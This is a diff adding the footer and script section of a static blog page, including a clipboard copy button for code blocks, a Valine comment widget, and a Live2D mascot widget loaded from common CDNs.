+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
